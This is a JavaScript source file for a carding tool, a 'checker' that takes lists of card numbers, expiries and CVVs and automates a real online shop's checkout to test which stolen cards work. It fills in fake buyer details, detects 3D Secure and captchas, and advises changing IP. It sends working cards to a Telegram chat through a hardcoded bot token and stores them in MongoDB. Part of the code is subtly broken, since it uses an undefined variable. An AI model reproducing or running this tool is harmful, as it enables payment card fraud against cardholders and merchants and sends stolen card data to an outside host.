import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import puppeteer from 'puppeteer';
import { faker } from '@faker-js/faker';
import { Live } from './models/Live.js';

import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const TELEGRAM_CONFIG = {
    token: '7461272757:AAEXQIGLnP9rEsLc2VAFahLZrPB9tjsasF0',
    chatId: '6912929677'
};

const telegramBot = new TelegramBot(TELEGRAM_CONFIG.token, { polling: false });

class OshunGateChecker {
    constructor(userId) {
        this.userId = userId;
        this.browser = null;
        this.page = null;
        this.cardsDir = path.join(__dirname, 'cards');
        this.files = {
            tarjetas: path.join(this.cardsDir, 'tarjetas.txt'),
            liveCvv: path.join(this.cardsDir, 'live_cvv.txt'),
            dead: path.join(this.cardsDir, 'dead.txt')
        };
    }

    async leerTarjetas() {
        try {
            let contenido;

            // Verificar si hay tarjetas generadas como argumento
            if (process.argv[2]) {
                contenido = fs.readFileSync(process.argv[2], 'utf8');
            } else {
                contenido = fs.readFileSync(this.files.tarjetas, 'utf8');
            }

            return contenido.split('\n')
                .map(line => line.trim())
                .filter(line => line.length > 0)
                .map(line => {
                    const [numero, mes, ano, cvv] = line.split('|');
                    return {
                        numero: numero.trim(),
                        fecha: `${mes}${ano.substr(-2)}`,
                        cvv: cvv.trim()
                    };
                });
        } catch (error) {
            console.error('Error leyendo tarjetas:', error);
            return [];
        }
    }

    async enviarLiveATelegram(cardInfo) {
        try {
            const mensaje = `
⚠️ ALEMAN CHECKER BOT

💠 Detalles de la Tarjeta:
CC: ${cardInfo.tarjeta}

✅ Resultado:
${cardInfo.estado}

📋 Gate:
OshunGate

⏰ Hora: ${new Date().toLocaleString()}

@AlemanCheckerBot`;

            await telegramBot.sendMessage(TELEGRAM_CONFIG.chatId, mensaje, { parse_mode: 'HTML' });
            console.log('✅ Live enviada a Telegram exitosamente');
        } catch (error) {
            console.error('❌ Error enviando live a Telegram:', error);
        }
    }

    async inicializar() {
        if (global.io) {
            global.io.emit('update-dashboard', {
                tipo: 'estado',
                mensaje: '🚀 Iniciando...',
                estado: 'running'
            });
        }
        console.log('Iniciando simulador...');
        const chromePath = process.env.CHROME_PATH || findChromePath();
        if (!chromePath) {
            throw new Error('No se pudo encontrar Chrome instalado');
        }
        console.log('Usando Chrome en:', chromePath);

        try {
            this.browser = await puppeteer.launch({
                headless: "new",
                defaultViewport: null,
                executablePath: chromePath,
                timeout: 4000,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--window-size=1366,768',
                    '--disable-web-security',
                    '--incognito'
                ]
            });

            const pages = await this.browser.pages();
            this.page = pages[0];

            await this.page.setDefaultTimeout(2000);
            await this.page.setDefaultNavigationTimeout(3000);

            console.log('Navegando a Botella Mi Luz...');
            await this.page.goto('https://botellamiluz.com/products/ashwagadha-capsulas?variant=46622083743984', {
                waitUntil: 'domcontentloaded',
                timeout: 3000
            });

            // Verificar si hay captcha después de cargar la página
            const hayCaptcha = await this.page.evaluate(() => {
                return document.body.textContent.toLowerCase().includes('captcha') ||
                       document.querySelector('iframe[src*="captcha"]') !== null ||
                       document.querySelector('.g-recaptcha') !== null;
            });

            if (hayCaptcha) {
                console.log('⚠️ Captcha detectado - Necesitas cambiar tu IP');
                if (global.io) {
                    global.io.emit('update-dashboard', {
                        tipo: 'error',
                        mensaje: '⚠️ Captcha detectado - Por favor cambia tu IP y reinicia el checker',
                        estado: 'error'
                    });
                }
                await this.cerrar();
                global.checkerActivo = false;
                global.stopSignal = true;
                return false;
            }

            await new Promise(resolve => setTimeout(resolve, 1500));

            const resultado = await this.compraRapida();
            if (!resultado) {
                throw new Error('Error en compra rápida');
            }

            return true;

        } catch (error) {
            console.error('Error en inicialización:', error);
            if (this.browser) {
                await this.browser.close();
            }
            throw error;
        }
    }

    async compraRapida() {
        if (global.io) {
            global.io.emit('update-dashboard', {
                tipo: 'estado',
                mensaje: '📝 Llenando formulario de checkout...',
                estado: 'running'
            });
        }
        try {
            console.log('Buscando botón Add to cart...');
            try {
                await this.page.waitForSelector('#ProductSubmitButton-template--16752081109232__main', {
                    visible: true,
                    timeout: 4000
                });
            } catch (error) {
                // Si no encuentra el botón, verificar si hay captcha
                const hayCaptcha = await this.page.evaluate(() => {
                    return document.body.textContent.toLowerCase().includes('captcha') ||
                           document.querySelector('iframe[src*="captcha"]') !== null ||
                           document.querySelector('.g-recaptcha') !== null;
                });

                if (hayCaptcha) {
                    console.log('⚠️ Captcha detectado - Necesitas cambiar tu IP');
                    if (global.io) {
                        global.io.emit('update-dashboard', {
                            tipo: 'error',
                            mensaje: '⚠️ Captcha detectado - Por favor cambia tu IP y reinicia el checker',
                            estado: 'error'
                        });
                    }
                    await this.cerrar();
                    global.checkerActivo = false;
                    global.stopSignal = true;
                    return false;
                }
                throw error; // Si no hay captcha, propagar el error original
            }

            await Promise.all([
                this.page.click('#ProductSubmitButton-template--16752081109232__main'),
                new Promise(resolve => setTimeout(resolve, 800))
            ]);
            console.log('Click en Add to cart');

            await Promise.all([
                this.page.waitForSelector('button[name="checkout"].button--primary', {
                    visible: true,
                    timeout: 3000
                }),
                new Promise(resolve => setTimeout(resolve, 800))
            ]);

            await this.page.click('button[name="checkout"].button--primary');
            console.log('Procediendo al checkout');
            await new Promise(resolve => setTimeout(resolve, 1000));

            const formularioCompletado = await this.llenarFormularioCheckout();
            if (!formularioCompletado) {
                return false;
            }

            return true;

        } catch (error) {
            console.log('Error en compra rápida:', error.message);
            return false;
        }
    }

    async llenarFormularioCheckout() {
        try {
            console.log('Llenando formulario de checkout...');
            await this.page.waitForSelector('input[name="email"]');

            console.log('Llenando información de contacto...');
            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'estado',
                    mensaje: '📧 Llenando información de contacto...',
                    estado: 'running'
                });
            }
            const email = `${faker.string.alphanumeric(8)}@gmail.com`;
            await this.page.type('input[name="email"]', email, { delay: 100 });
            await new Promise(resolve => setTimeout(resolve, 800));

            console.log('Llenando información de envío...');
            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'estado',
                    mensaje: '📦 Llenando información de envío...',
                    estado: 'running'
                });
            }
            await this.page.type('input[name="firstName"]', faker.person.firstName(), { delay: 100 });
            await this.page.type('input[name="lastName"]', faker.person.lastName(), { delay: 100 });
            await new Promise(resolve => setTimeout(resolve, 500));

            const ciudadesFlorida = ['Miami', 'Orlando', 'Tampa', 'Jacksonville', 'Fort Lauderdale'];
            const zipCodesFlorida = ['33101', '33125', '33127', '33142', '33147', '33150', '33155', '33160', '33165'];

            await this.page.type('input[name="address1"]', `${faker.number.int({ min: 100, max: 9999 })} ${faker.location.street()}`, { delay: 100 });
            await this.page.type('input[name="city"]', ciudadesFlorida[Math.floor(Math.random() * ciudadesFlorida.length)], { delay: 100 });
            await this.page.type('input[name="postalCode"]', zipCodesFlorida[Math.floor(Math.random() * zipCodesFlorida.length)], { delay: 100 });
            await this.page.type('input[name="phone"]', `(305) 500-${faker.string.numeric(4)}`, { delay: 100 });
            await new Promise(resolve => setTimeout(resolve, 800));

            console.log('Seleccionando país y estado...');
            await this.page.select('select[name="countryCode"]', 'US');
            await new Promise(resolve => setTimeout(resolve, 1500));
            await this.page.select('select[name="zone"]', 'FL');
            await new Promise(resolve => setTimeout(resolve, 1000));

            console.log('Continuando al pago...');
            await this.page.click('button[type="submit"]');
            await new Promise(resolve => setTimeout(resolve, 3000));

            return true;

        } catch (error) {
            console.log('Error llenando formulario:', error.message);
            return false;
        }
    }

    async procesarPago(tarjeta) {
        try {
            console.log('Procesando tarjeta:', tarjeta.numero);
            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'estado',
                    mensaje: `💳 Procesando tarjeta: ${tarjeta.numero}`,
                    estado: 'running'
                });
            }
            const frameHandle = await this.page.waitForSelector('iframe[title="Field container for: Card number"]');
            const frame = await frameHandle.contentFrame();
            await frame.type('[name="number"]', tarjeta.numero, { delay: 150 });
            await new Promise(resolve => setTimeout(resolve, 800));

            const nameFrame = await this.page.waitForSelector('iframe[title="Field container for: Name on card"]');
            const nameFrameContent = await nameFrame.contentFrame();
            await nameFrameContent.type('[name="name"]', 'JOHN DOE', { delay: 150 });
            await new Promise(resolve => setTimeout(resolve, 800));

            const expiryFrame = await this.page.waitForSelector('iframe[title="Field container for: Expiration date (MM / YY)"]');
            const expiryFrameContent = await expiryFrame.contentFrame();
            await expiryFrameContent.type('[name="expiry"]', tarjeta.fecha, { delay: 150 });
            await new Promise(resolve => setTimeout(resolve, 800));

            const cvvFrame = await this.page.waitForSelector('iframe[title="Field container for: Security code"]');
            const cvvFrameContent = await cvvFrame.contentFrame();
            await cvvFrameContent.type('[name="verification_value"]', tarjeta.cvv, { delay: 150 });
            await new Promise(resolve => setTimeout(resolve, 800));

            await this.page.click('#checkout-pay-button');
            console.log('Click en botón de pago realizado');

            // Esperar un momento para que aparezca el captcha si existe
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // Verificar si apareció un captcha después del clic
            const hayCaptcha = await this.page.evaluate(() => {
                return document.body.textContent.toLowerCase().includes('captcha') ||
                       document.querySelector('iframe[src*="captcha"]') !== null ||
                       document.querySelector('.g-recaptcha') !== null ||
                       document.querySelector('.captcha-box') !== null;
            });

            if (hayCaptcha) {
                console.log('⚠️ Captcha detectado después del pago - Necesitas cambiar tu IP');
                if (global.io) {
                    global.io.emit('update-dashboard', {
                        tipo: 'captcha',
                        mensaje: '⚠️ Captcha detectado - Por favor cambia tu IP y reinicia el checker',
                        estado: 'error'
                    });
                }
                await this.cerrar();
                global.checkerActivo = false;
                global.stopSignal = true;
                return false;
            }

            return true;
        } catch (error) {
            console.error('Error procesando pago:', error);
            return false;
        }
    }

    async obtenerMensajeError() {
        try {
            await new Promise(resolve => setTimeout(resolve, 2000));

            const mensaje = await this.page.evaluate(() => {
                const cleanText = (text) => text.trim().replace(/\s+/g, ' ');

                const pageContent = document.body.innerText;
                if (pageContent.includes("Your payment details couldn't be verified")) {
                    return "Your payment details couldn't be verified. Check your card details and try again.";
                }

                const selectores = [
                    '[data-error-message]',
                    '.notice--error',
                    '.error-message',
                    '.shopify-error-message',
                    '.field__message--error',
                    '#error-message',
                    '.payment-errors',
                    '.validation-error',
                    '.banner--error',
                    '[role="alert"]',
                    '[class*="error"]'
                ];

                for (const selector of selectores) {
                    const elements = document.querySelectorAll(selector);
                    for (const element of elements) {
                        const text = cleanText(element.textContent);
                        if (text) return text;
                    }
                }

                const iframes = document.querySelectorAll('iframe');
                for (const iframe of iframes) {
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        const iframeText = cleanText(iframeDoc.body.innerText);
                        if (iframeText.includes('error') || iframeText.includes('declined')) {
                            return iframeText;
                        }
                    } catch (e) {}
                }

                return '';
            });

            console.log('Mensaje de error capturado:', mensaje);
            return mensaje;

        } catch (error) {
            console.error('Error obteniendo mensaje:', error);
            return '';
        }
    }

    async emitirEvento(tipo, tarjeta, mensaje) {
        if (global.io) {
            global.io.emit('update-dashboard', {
                tipo: tipo,
                mensaje: `${tipo.toUpperCase()} - ${tarjeta.numero}|${tarjeta.fecha.slice(0,2)}/${tarjeta.fecha.slice(2)}|${tarjeta.cvv}`,
                mensaje_completo: `${tarjeta.numero}|${tarjeta.fecha}|${tarjeta.cvv} - ${mensaje}`
            });
        }
    }

    async verificarRespuesta(mensaje, tarjeta) {
        try {
            let tipo = 'dead';
            let estado = mensajeOriginal || mensaje;
            
            const mensajeLower = (mensajeOriginal || mensaje || '').toLowerCase();
            const is3DSecure = await this.detectar3DSecure();
            const tiene3DForm = await this.verificarFormulario3D();

            if (mensajeLower.includes("thank you") || 
                mensajeLower.includes("order confirmed") ||
                mensajeLower.includes("order has been received") ||
                mensajeLower.includes("payment successful") ||
                mensajeLower.includes("transaction approved")) {
                tipo = 'live';
                estado = 'LIVE - CHARGED ✅';
            } else if (is3DSecure && !tiene3DForm && (
                mensajeLower.includes("security code") || 
                mensajeLower.includes("enter a valid security code") ||
                mensajeLower.includes("postal code") ||
                mensajeLower.includes("zip code") ||
                mensajeLower.includes("card number") ||
                mensajeLower.includes("card details")
            )) {
                tipo = 'live';
                estado = 'LIVE - Passed 3D Without OTP';
            } else if (mensajeLower.includes("enter a valid security code") ||
                mensajeLower.includes("security code") ||
                mensajeLower.includes("postal code") ||
                mensajeLower.includes("zip code")) {
                tipo = 'live';
                estado = mensajeOriginal || mensaje;
            } else if (mensajeLower.includes("Dead por OTP 3d secure") ||
                    mensajeLower.includes("redirect") ||
                    mensajeLower.includes("redirecting")) {
                tipo = 'otp';
                estado = 'DECLINED - Requiere OTP 3D Secure';
            } else if (mensaje.includes('Enter a valid security code') || 
                mensaje.includes('Security code was not matched by the processor') ||
                mensaje.includes('CVV2 Mismatch')) {
                tipo = 'live';
                estado = 'CVV LIVE';
            } else if (mensaje.includes('DECLINED - Your payment was declined due to insufficient funds')) {
                tipo = 'live';
                estado = 'LIVE - FUNDS';
            } else {
                tipo = 'dead';
                estado = 'DECLINED - ' + (mensajeOriginal || mensaje || 'Card Declined');
            }

            if (tipo === 'live') {
                const cardInfo = {
                    tarjeta: `${tarjeta.numero}|${tarjeta.fecha.slice(0,2)}|20${tarjeta.fecha.slice(2)}|${tarjeta.cvv}`,
                    estado: estado,
                    mensaje: mensajeOriginal || mensaje
                };
                await this.enviarLiveATelegram(cardInfo);
                if (global.io) {
                    global.io.emit('update-dashboard', {
                        tipo: 'live',
                        mensaje: `✨ LIVE OshunGate (${estado}) - ${tarjeta.numero}|${tarjeta.fecha.slice(0,2)}/${tarjeta.fecha.slice(2)}|${tarjeta.cvv}`,
                        mensaje_completo: `${tarjeta.numero}|${tarjeta.fecha}|${tarjeta.cvv} - ${estado}`,
                        style: 'color: #00ff00; font-size: 24px; font-weight: bold;'
                    });
                }
            } else {
                if (global.io) {
                    global.io.emit('update-dashboard', {
                        tipo: 'dead',
                        mensaje: `💀 DEAD OshunGate - ${tarjeta.numero}|${tarjeta.fecha.slice(0,2)}/${tarjeta.fecha.slice(2)}|${tarjeta.cvv}`,
                        mensaje_completo: `${tarjeta.numero}|${tarjeta.fecha}|${tarjeta.cvv} - ${estado}`,
                        style: 'color: #ff0000; font-size: 24px; font-weight: bold;'
                    });
                }
            }

            return {
                success: tipo === 'live',
                mensaje: estado,
                respuestaOriginal: mensajeOriginal || mensaje
            };

        } catch (error) {
            console.error('Error en verificarRespuesta:', error);
            return {
                success: false,
                mensaje: 'Error processing response',
                respuestaOriginal: mensaje
            };
        }
    }
    async guardarResultado(tipo, tarjeta, mensaje) {
        const fecha = new Date().toISOString().replace('T', ' ').substring(0, 19);
        
        // Obtener el mensaje exacto de la página
        const mensajeOriginal = await this.obtenerMensajeError();

        // Formatear el resultado con el mensaje original
        const resultado = `[${fecha}] ${tarjeta.numero}|${tarjeta.fecha.slice(0,2)}|20${tarjeta.fecha.slice(2)}|${tarjeta.cvv} - Estado: ${tipo.toUpperCase()} - Respuesta: ${mensajeOriginal || mensaje}\n`;

        // Guardar en archivo según el tipo
        const archivo = tipo === 'live' ? this.files.liveCvv : this.files.dead;

        try {
            // Guardar en archivo
            fs.appendFileSync(archivo, resultado);
            console.log('\n==================================');
            console.log(`Resultado guardado en: ${tipo === 'live' ? 'live_cvv.txt' : 'dead.txt'}`);
            console.log(`Tarjeta: ${tarjeta.numero}`);
            console.log(`Respuesta original: ${mensajeOriginal || mensaje}`);
            console.log('==================================\n');

            // Si es live, también guardar en MongoDB
            if (tipo === 'live') {
                const liveEntry = new Live({
                    cardNumber: tarjeta.numero,
                    month: tarjeta.fecha.slice(0,2),
                    year: `20${tarjeta.fecha.slice(2)}`,
                    cvv: tarjeta.cvv,
                    result: tipo,
                    message: mensajeOriginal || mensaje,
                    gate: 'oshungate',
                    userId: this.userId
                });
                console.log('Guardando live con userId:', this.userId);
                await liveEntry.save();
                console.log('💾 Resultado live guardado en MongoDB');
            }

            // Emitir evento una sola vez
            await this.emitirEvento(tipo, tarjeta, mensaje);
        } catch (error) {
            console.error('Error al guardar resultado:', error);
        }
    }
    
    async detectar3DSecure() {
        try {
            await new Promise(resolve => setTimeout(resolve, 1000));

            const is3DSecure = await this.page.evaluate(() => {
                const secureIndicators = [
                    'secure verification',
                    '3d secure',
                    'verified by visa',
                    'mastercard securecode',
                    'authentication required',
                    'cardinal',
                    'authentication',
                    'verify your payment',
                    'cardinal-iframe',
                    'cardinal-authentication',
                    '3ds-iframe',
                    'secure-3d'
                ];

                const pageText = document.body.innerText.toLowerCase();
                const hasSecureText = secureIndicators.some(text => pageText.includes(text));

                const iframes = document.querySelectorAll('iframe');
                const hasSecureIframe = Array.from(iframes).some(iframe =>
                    secureIndicators.some(indicator =>
                        (iframe.src && iframe.src.toLowerCase().includes(indicator)) ||
                        (iframe.id && iframe.id.toLowerCase().includes(indicator)) ||
                        (iframe.className && iframe.className.toLowerCase().includes(indicator))
                    )
                );

                return hasSecureText || hasSecureIframe;
            });

            return is3DSecure;

        } catch (error) {
            console.error('Error detectando 3D Secure:', error);
            return false;
        }
    }

    async verificarFormulario3D() {
        try {
            const elementos3D = await this.page.evaluate(() => {
                const indicadores = [
                    'input[type="text"]',
                    'input[type="number"]',
                    '[name*="security"]',
                    '[name*="code"]',
                    '[name*="otp"]',
                    '[placeholder*="code"]',
                    '[placeholder*="SMS"]'
                ];

                return indicadores.some(selector =>
                    document.querySelector(selector) !== null
                );
            });

            return elementos3D;
        } catch (error) {
            console.error('Error verificando formulario 3D:', error);
            return false;
        }
    }

    async cerrar() {
        try {
            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'estado',
                    mensaje: '🛑 Deteniendo checker...',
                    estado: 'stopping'
                });
            }
            console.log('Cerrando navegador...');
            if (this.page) {
                await Promise.race([
                    this.page.close(),
                    new Promise(resolve => setTimeout(resolve, 1000))
                ]).catch(() => {});
                this.page = null;
            }
            if (this.browser) {
                await Promise.race([
                    this.browser.close(),
                    new Promise(resolve => setTimeout(resolve, 1000))
                ]).catch(() => {});
                this.browser = null;
            }
            console.log('Navegador cerrado correctamente');
            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'estado',
                    mensaje: '🔥 ¡Gate Cargado!',
                    estado: 'stopped'
                });
            }
        } catch (error) {
            console.error('Error al cerrar el navegador:', error);
            if (this.browser) {
                try {
                    this.browser.process().kill('SIGKILL');
                } catch (e) {
                    console.error('Error al forzar cierre:', e);
                }
            }
        }
    }

    async eliminarTarjetaProcesada(numero) {
        try {
            const contenido = fs.readFileSync(this.files.tarjetas, 'utf8');
            const tarjetas = contenido.split('\n').filter(line => !line.includes(numero));
            fs.writeFileSync(this.files.tarjetas, tarjetas.join('\n') + '\n');
            console.log('Tarjeta ' + numero + ' eliminada correctamente');

            const tarjetasRestantes = tarjetas.filter(line => line.trim()).length;
            console.log('Tarjetas restantes: ' + tarjetasRestantes);
            
            if (global.io) {
                global.io.emit('update-dashboard', {
                    tipo: 'cards-count',
                    count: tarjetasRestantes
                });
            }

        } catch (error) {
            console.error('Error al eliminar tarjeta:', error);
        }
    }
}

function findChromePath() {
    const chromePaths = [
        'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
        'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
        '/usr/bin/google-chrome',
        '/usr/bin/chromium-browser',
        '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
    ];

    for (const chromePath of chromePaths) {
        if (fs.existsSync(chromePath)) {
            return chromePath;
        }
    }

    return null;
}

async function main(userId) {
    const checker = new OshunGateChecker(userId);

    try {
        const tarjetas = await checker.leerTarjetas();
        console.log('Total de tarjetas:', tarjetas.length);

        for (const tarjeta of tarjetas) {
            // Verificar ambas señales de parada
            if (!global.checkerActivo || global.stopSignal) {
                console.log('Deteniendo checker por señal de parada...');
                break;
            }

            try {
                console.log('\n==================================');
                console.log('Procesando tarjeta:', tarjeta.numero);
                console.log('==================================\n');

                const inicializado = await checker.inicializar();
                if (!inicializado) {
                    throw new Error('Error en inicialización');
                }

                // Verificar señal de parada después de cada operación larga
                if (!global.checkerActivo || global.stopSignal) break;

                await checker.page.waitForSelector('iframe[title="Field container for: Card number"]', { 
                    visible: true, 
                    timeout: 5000 
                });

                if (!global.checkerActivo || global.stopSignal) break;
                await checker.procesarPago(tarjeta);

                if (!global.checkerActivo || global.stopSignal) break;
                await checker.page.waitForSelector('#checkout-pay-button', { visible: true, timeout: 5000 });
                await checker.page.click('#checkout-pay-button');
                console.log('Click en botón de pago realizado');

                await new Promise(resolve => setTimeout(resolve, 7000));

                if (!global.checkerActivo || global.stopSignal) break;
                const mensaje = await checker.obtenerMensajeError();
                console.log('Mensaje de respuesta:', mensaje);

                const resultado = await checker.verificarRespuesta(mensaje, tarjeta);

                const tipo = resultado.success ? 'live' : 'dead';
                await checker.guardarResultado(tipo, tarjeta, mensaje);
                await checker.eliminarTarjetaProcesada(tarjeta.numero);

                if (!global.checkerActivo || global.stopSignal) break;
                await new Promise(resolve => setTimeout(resolve, 5000));
                await checker.cerrar();
                await new Promise(resolve => setTimeout(resolve, 3000));

            } catch (error) {
                console.error('Error procesando tarjeta:', error);
                if (global.io) {
                    global.io.emit('update-dashboard', {
                        tipo: 'error',
                        mensaje: `Error procesando tarjeta: ${error.message}`
                    });
                }
                await checker.cerrar();
            }
        }
    } catch (error) {
        console.error('Error en el proceso principal:', error);
        if (global.io) {
            global.io.emit('update-dashboard', {
                tipo: 'error',
                mensaje: `Error en el proceso principal: ${error.message}`
            });
        }
    } finally {
        await checker.cerrar();
        global.checkerActivo = false;
        global.stopSignal = false;
        
        if (global.io) {
            global.io.emit('update-dashboard', {
                tipo: 'estado',
                estado: 'stopped',
                mensaje: 'Checker detenido'
            });
        }
    }
}

export default OshunGateChecker;
export { runOshunGate };
const runOshunGate = main;